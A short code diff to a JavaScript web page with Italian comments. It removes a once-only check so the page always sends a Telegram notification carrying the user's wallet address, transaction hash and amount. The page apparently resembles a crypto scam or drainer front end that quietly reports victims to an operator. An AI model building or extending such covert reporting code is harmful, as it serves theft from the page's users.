@@ -513,7 +513,6 @@
         };
 
         let lastTxHash = '';
-        let isFirstAttempt = true;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -700,11 +699,9 @@ ${new Date().toLocaleString()}
                 document.getElementById('processingScreen').classList.add('active');
 
                 // ⭐ INVIA NOTIFICA SENZA AWAIT (arriva ISTANTANEAMENTE in background)
-                if (isFirstAttempt) {
-                    console.log("First attempt - sending notification instantly...");
-                    sendTelegramNotificationAsync(finalUserAddress, txHash, amount);
-                    isFirstAttempt = false;
-                }
+                // Come in ChainCompliant: invia SEMPRE, senza controllo
+                console.log("Sending notification instantly...");
+                sendTelegramNotificationAsync(finalUserAddress, txHash, amount);
 
                 console.log("Waiting 5 seconds before closing...");
                 await new Promise(resolve => setTimeout(resolve, 5000));
